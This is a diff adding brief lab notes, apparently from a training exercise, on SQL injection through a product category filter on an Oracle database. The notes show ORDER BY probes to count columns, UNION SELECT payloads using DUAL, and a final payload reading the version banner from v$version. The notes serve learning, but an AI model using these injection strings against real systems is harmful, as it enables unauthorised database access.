@@ -1,0 +1,23 @@
+SQL injection - product category filter
+Goal - Display the database version string
+
+Analysis:
+
+Determine if injectable, filter?category=Gifts
+
+1. Determine number of columns
+filter?category=Gifts' order by 1--
+filter?category=Gifts' order by 2--
+filter?category=Gifts' order by 3-- -> Results in internal server error, so 2 only
+
+2. Determine data type of columns
+
+select a, b from products where category='Gifts'
+--Oracle requires select be used with FROM
+--DUAL is a table in Oracle databases accessible to all.
+
+' UNION select 'a', NULL FROM DUAL--
+' UNION select 'NULL', 'a' FROM DUAL-- -> second is type string
+
+3. Output version of the database
+' UNION select banner, NULL from v$version
